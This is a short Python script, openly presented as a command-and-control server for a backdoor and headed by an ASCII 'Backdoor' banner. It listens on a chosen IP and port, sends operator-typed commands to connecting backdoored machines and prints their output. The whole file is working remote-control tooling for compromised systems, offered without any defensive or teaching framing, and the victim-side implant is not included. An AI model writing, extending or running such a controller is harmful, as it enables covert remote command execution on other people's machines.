import socket

def start_c2_server():

    print("""
    
  ____             _       _                  
 |  _ \           | |     | |                 
 | |_) | __ _  ___| | ____| | ___   ___  _ __ 
 |  _ < / _` |/ __| |/ / _` |/ _ \ / _ \| '__|
 | |_) | (_| | (__|   < (_| | (_) | (_) | |   
 |____/ \__,_|\___|_|\_\__,_|\___/ \___/|_|   
                                              
                        
""")

    host = input("Enter the IP address to listen on: ")
    port = int(input("Enter the port to listen on: "))

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)

    print("[+] Listening for connections...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"[+] Connection from {addr[0]}:{addr[1]}")

        # Send command to backdoor
        command = input("Enter command to send: ")
        client_socket.send(command.encode())

        # Receive output from backdoor
        output = b""
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            output += data

        print("[+] Binary output from backdoor:")
        try:
            print(output.decode())  # Try decoding as UTF-8
        except UnicodeDecodeError:
            print("[+] Output is not UTF-8 encoded:")
            print(output)

        client_socket.close()

if __name__ == "__main__":
    start_c2_server()

